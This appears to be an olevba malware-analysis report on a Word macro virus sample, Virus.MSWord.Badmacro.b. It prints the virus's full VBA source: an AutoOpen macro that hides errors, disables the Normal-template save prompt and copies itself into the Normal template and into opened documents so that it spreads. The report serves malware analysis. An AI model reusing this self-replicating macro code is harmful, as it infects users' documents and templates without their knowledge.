olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Badmacro.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Badmacro.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Badmacro.b - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Ñîâñåì ïëîõîé ìàêðîñ."
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoOpen"
 On Error Resume Next
 Options.VirusProtection = True
 Options.SaveNormalPrompt = False
 Application.OrganizerCopy Source:=ActiveDocument.FullName, _
  Destination:=NormalTemplate.FullName, Name:="NewMacros", _
  Object:=wdOrganizerObjectProjectItems
 Application.OrganizerCopy Destination:=ActiveDocument.FullName, _
  Source:=NormalTemplate.FullName, Name:="NewMacros", _
  Object:=wdOrganizerObjectProjectItems
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+----------+--------------------+---------------------------------------------+

